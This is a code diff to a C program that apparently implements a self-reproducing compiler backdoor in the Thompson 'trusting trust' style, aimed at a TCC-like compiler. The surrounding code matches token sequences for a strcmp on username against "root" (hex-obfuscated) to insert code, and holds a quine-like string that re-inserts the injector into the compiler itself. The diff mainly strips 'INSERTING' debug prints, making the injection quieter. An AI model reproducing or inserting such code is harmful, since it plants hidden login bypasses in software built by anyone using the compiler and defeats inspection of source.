@@ -38,7 +38,6 @@ void match(char **match_toks, int match_len, int *match, char *insert) {
         (*match) = 0;
     }
     if ((*match) == match_len) {
-        printf("INSERTING\n");
         insert_txt = 1;
         text = (uint8_t *)insert;
         (*match) = 0;
@@ -74,7 +73,6 @@ char *hoist_txt = "int acdee = 0, bcdee = 0, ccdee = 0, dcdee = 0, ecdee = 0;\n"
                     "        (*match) = 0;\n"
                     "    }\n"
                     "    if ((*match) == match_len) {\n"
-                    "        printf(\"INSERTING\");\n"
                     "        insert_txt = 1;\n"
                     "        text = (uint8_t *)insert;\n"
                     "        (*match) = 0;\n"
@@ -83,11 +81,7 @@ char *hoist_txt = "int acdee = 0, bcdee = 0, ccdee = 0, dcdee = 0, ecdee = 0;\n"
                     "\n"
                     "char *login_toks[] = {\"strcmp\", \"(\", \"username\", \",\", (char[]){0x22,0x72,0x6F,0x6F,0x74,0x22,0x00}, \")\"};\n"
                     "char *hoist_toks[] = {\"tok_flags\", \";\", \"ST_DATA\", \"int\", \"parse_flags\", \";\"};\n"
-                    "char *insert_toks[] = {\"static\", \"void\", \"next_nomacro\",\n"
-                                            "\"(\", \"void\", \")\", \"{\", \"int\", \"t\", \",\", \"c\",\n"
-                                            "\",\", \"is_long\", \",\", \"len\", \";\", \"TokenSym\",\n"
-                                            "\"*\", \"ts\", \";\", \"uint8_t\", \"*\", \"p\", \",\",\n"
-                                            "\"*\", \"p1\", \";\", \"unsigned\", \"int\", \"h\", \";\"};\n"
+                    "char *insert_toks[] = {\"static\", \"void\", \"next_nomacro\", \"(\", \"void\", \")\", \"{\", \"int\", \"t\", \",\", \"c\", \",\", \"is_long\", \",\", \"len\", \";\", \"TokenSym\", \"*\", \"ts\", \";\", \"uint8_t\", \"*\", \"p\", \",\", \"*\", \"p1\", \";\", \"unsigned\", \"int\", \"h\", \";\"};\n"
                     "char *update_tok1[] = {\"keep_tok_flags\", \":\"};\n"
                     "char *update_tok2[] = {\"keep_tok_flags\", \":\", \"file\", \"->\", \"buf_ptr\", \"=\", \"p\", \";\"};\n"
                     "\n"
